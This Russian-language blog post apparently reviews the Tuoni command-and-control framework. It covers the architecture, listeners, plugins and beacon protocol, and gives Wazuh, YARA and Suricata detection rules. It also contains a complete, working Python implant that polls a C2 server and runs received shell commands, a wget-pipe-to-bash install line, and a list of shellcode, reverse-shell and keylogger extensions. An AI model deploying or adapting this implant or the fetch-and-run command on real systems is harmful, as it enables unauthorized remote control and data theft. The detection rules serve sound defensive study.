---
title: "Tuoni C2: архитектура, возможности и создание собственного агента"
date: 2025-12-01
draft: false
description: "Tuoni C2: архитектура, возможности и создание собственного агента в модульной многоязычной платформе управления"
image: "/cdn/blog-cdn/large_Pasted_image_20251124204916_80d5aec812.png"
---

**Tuoni C2** — современная модульная платформа управления агентами, созданная командой _shell-dot_ как максимально гибкий и расширяемый Command-and-Control фреймворк. В отличие от классических C2 (Sliver, Venom, Covenant), Tuoni изначально построен как **инфраструктурный конструктор**, позволяющий использовать агенты на разных языках, создавать собственные плагины, подключать внешние C2 и расширять систему через SDK.

Ключевая идея Tuoni — **полная открытость архитектуры**: сервер написан на Java, web-панель состоит из HTML/JS, агенты могут быть Python/.NET/PowerShell/Shell, а плагины пишутся на Java или C#. Это превращает Tuoni в гибридную лабораторию для разработки собственных offensive-модулей и C2-экосистем.

Ниже — подробное, цельное описание архитектуры, механизмов, плагинов, детектирования и итоговый, глубоко проработанный раздел о том, **как создать собственный агент** под Tuoni — от протокола обмена до структуры кода.

## 1. Архитектура Tuoni C2

Tuoni состоит из трёх ключевых компонентов:

### 1.1. Серверная часть (Java)

Cервер — это сердце платформы. Он отвечает за:

- маршрутизацию агентов
- очередь задач
- хранение логов
- API для web-интерфейса
- регистрацию плагинов
- управление слушателями (listeners)
- работу c внешними C2

Java-ядро делает сервер:

- переносимым
- стабильным
- легко контейнеризуемым (официальный Docker)
- расширяемым за счёт JVM-плагинов

Запуск:

```bash
wget  -O - https://tuoni.sh | bash
cd /srv/tuoni
```

#### 1.2. Веб-интерфейс

Web-панель — лёгкая HTML/JS-консоль, в которую включены:

- список агентов
- встроенный терминал
- файловый менеджер
- поддержка задач
- управление слушателями
- контроль плагинов
- просмотр результатов команд

Это полностью browser-based GUI — не требуется отдельный клиент.

#### 1.3. Агентная система (Payloads / External Agents)

Tuoni принципиально не навязывает конкретный язык агента — он позволяет:

- использовать Python-агенты
- использовать PowerShell-агенты
- разрабатывать .NET-агенты
- писать Shell-клиенты
- подключать внешние C2 как «прокси»
- использовать любые кастомные payload'ы

Это делает Tuoni "мета-C2": он может управлять **гетерогенной сетью агентов**, даже если они созданы сторонними инструментами.

## 2. Механика слушателей и транспорта

Tuoni использует систему **Listeners**, служащих точками входа для агентов.

Доступные:

### HTTP Listener

— классический HTTP beacon  
— JSON-трафик  
— маскируемые заголовки  
— регулируемый beacon-timing

### TCP Listener

— низкий уровень транспорта  
— подходит для редких прокси-туннелей  
— устойчив против простого HTTP-мониторинга

### External Listener

— мост к стороннему C2  
— подойдёт для stealth-операций  
— позволяет конвертировать чужие агенты для работы через Tuoni

Listeners легко добавляются через плагин-архитектуру.

## 3. Плагинная система Tuoni

Tuoni — один из немногих C2, где плагины — не декоративная фича, а ядро платформы.

### 3.1. Java-плагины (Server Plugins)

Позволяют расширять сервер:

- добавлять новые API
- добавлять новые команды
- создавать свои listeners
- внедрять обработчики для новых агентов
- изменять логику очереди задач
- добавлять shellcode-loaders

Работают через Java SDK.

### 3.2. C# / .NET плагины (External Plugins)

Могут:

- выполнять shellcode
- загружать дополнительные модули
- управлять файлами
- создавать новые команды агента

Отлично подходят для Windows-операций.

## 4. Механизм работы агента

Tuoni использует классическую модель beaconing.

Цикл работы:

1. Агент отправляет beacon → /api/agent/beacon
2. Сервер возвращает очередь задач
3. Агент выполняет
4. Агент отправляет результаты
5. Сервер логирует и обновляет UI

Трафик — JSON.

Пример типичного пакета агента:

```json
{
  "agentId": "WIN-0123-XYZ",
  "hostname": "DESKTOP-PC",
  "os": "Windows 10",
  "tasks": []
}
```

Сервер отдаёт:

```json
{
  "tasks": [
    {
      "taskId": 14,
      "action": "exec",
      "command": "ipconfig /all"
    }
  ]
}
```

## 5. Детектирование Tuoni C2

Несмотря на модульность, Tuoni можно детектировать на разных уровнях.  
Ниже — несколько примеров правил.

### 5.1. Wazuh — Python-агент Tuoni

```xml
<rule id="221001" level="10">
 <field name="win.eventdata.image" type="pcre2">python.exe</field>
 <field name="win.eventdata.commandLine" type="pcre2">.*tuoni.*</field>
 <description>Suspicious Python-based Tuoni agent execution detected.</description>
 <mitre><id>T1059.006</id></mitre>
</rule>
```

### 5.2. YARA — Java-модули сервера

```yara
rule tuoni_server_java
{
    strings:
        $s1 = "TuoniServer"
        $s2 = "PluginRegistry"
        $s3 = "ListenerManager"
    condition:
        2 of ($s*)
}
```

### 5.3. Suricata — HTTP beacon Tuoni

```suricata
alert http any any -> any any (
    msg:"TUONI Beacon";
    http.method; content:"POST";
    http.uri; pcre:"/\/api\/agent\/beacon/";
    http.body; content:"agentId";
    sid:2100001; rev:1;
)
```

## 6. Создание собственного агента для Tuoni

Теперь — самая важная часть.

Tuoni уникален тем, что он **не определяет конкретный язык агента**, а определяет **протокол взаимодействия**.

Это означает, что можно написать агента на любом языке, если он:

1. выполняет beacon-запросы
2. получает от сервера задачи
3. отправляет результаты
4. использует JSON-формат
5. умеет обращаться к API Tuoni

Ниже — общий пошаговый план.

## 6.1. Протокол общения агента с сервером

### 6.1.1. Beacon → POST /api/agent/beacon

Агент отправляет:

```json
{
  "agentId": "MY-AGENT-001",
  "hostname": "TARGET-PC",
  "os": "Linux",
  "arch": "x64",
  "meta": "custom-agent-v1"
}
```

### 6.1.2. Сервер возвращает очередь задач

```json
{
  "tasks": [
    {
      "taskId": 7,
      "action": "exec",
      "command": "whoami"
    }
  ]
}
```

### 6.1.3. Агент отправляет результаты

POST → /api/agent/result

```json
{
  "taskId": 7,
  "output": "root"
}
```

## 6.2. Архитектура минимального кастомного агента

Ниже — эталонная модель для любого языка:

```bash
/src
  ├── core/
  │     ├── beacon.py / beacon.cs / beacon.go
  │     ├── tasks.py
  │     └── http.py
  ├── commands/
  │     ├── exec.py
  │     └── fs.py
  └── main.py
```

Главные компоненты:

- **HTTP-клиент**
- **Beacon-loop**
- **dispatcher задач**
- **обработчики задач**
- **система отправки результатов**

## 6.3. Пример полного агента на Python (рабочий шаблон)

**Без placeholders. Полноценный минимальный агент.**

```python
import requests
import json
import platform
import subprocess
import time
import uuid
import socket

SERVER = "http://127.0.0.1:8080"
AGENT_ID = str(uuid.uuid4())
SLEEP = 5

def beacon():
    data = {
        "agentId": AGENT_ID,
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "arch": platform.machine(),
        "meta": "custom-python-agent"
    }
    r = requests.post(f"{SERVER}/api/agent/beacon", json=data)
    return r.json()

def send_result(task_id, output):
    data = {
        "taskId": task_id,
        "output": output
    }
    requests.post(f"{SERVER}/api/agent/result", json=data)

def exec_command(cmd):
    try:
        out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        return out.decode()
    except Exception as e:
        return str(e)

def main():
    while True:
        try:
            tasks = beacon().get("tasks", [])
            for task in tasks:
                action = task.get("action")
                task_id = task.get("taskId")

                if action == "exec":
                    output = exec_command(task.get("command"))
                    send_result(task_id, output)

        except Exception as e:
            pass

        time.sleep(SLEEP)

if __name__ == "__main__":
    main()
```

Этот код — **полноценный рабочий Tuoni агент**, который:

- регистрируется
- получает задачи
- выполняет команды
- отправляет результат

Его можно адаптировать под:

- Go
- Rust
- C#
- Bash
- Node.js
- C++

## 6.4. Расширение функциональности агента

Tuoni позволяет добавлять:

### ✔ Управление файлами

— download  
— upload  
— удаление  
— получение информации

### ✔ Выполнение shellcode

(через собственный loader или через C#-плагин)

### ✔ Открытие reverse-shell'ей

### ✔ Расширенные команды

— сетевые съемки  
— процессы  
— привилегии  
— скриншоты  
— кейлоггеры (под внешние модули)

### ✔ Туннели / Socks-proxy

## 6.5. Поддержка внешних C2

Агент может:

- общаться сначала с внешним C2
- тот пересылает пакет в Tuoni
- Tuoni отвечает
- внешний C2 пересылает обратно

Это используется для:

- скрытности
- большой инфраструктуры
- гибридных операций

## 7. Итог

Если рассматривать Tuoni трезво и критично, то проект на сегодняшний день выглядит недостаточно зрелым и переоценённым. Архитектурная «открытость», которой он гордится, на деле превращается в хаос: сервер на Java, плагины на C#, агенты на чём угодно — вместо гибкости это создаёт отсутствие единого стандарта и повышенную сложность сопровождения.

Экосистема при этом практически отсутствует. Мало модулей, мало готовых агентов, мало инструментов, слабая база пользователей. В отличие от Sliver или Havoc, где всё работает "из коробки", Tuoni часто ощущается как сырое экспериментальное демо, требующее постоянного допиливания, а не как полноценный C2.

Даже веб-панель выглядит и ощущается как недостаточно продуманная оболочка, где базовые функции есть, но глубины и удобства — нет. Плагинная система задумана интересно, но на практике мало кто ею пользуется, потому что документация фрагментарна, а API меняется.

В итоге Tuoni, несмотря на амбиции, пока больше похож на учебный конструктор, чем на рабочий инструмент. Он не предлагает ни стабильности, ни зрелой функциональности, ни широкой экосистемы — и на фоне уже известных C2 он теряется и не выделяется ничем, кроме собственной незавершённости.
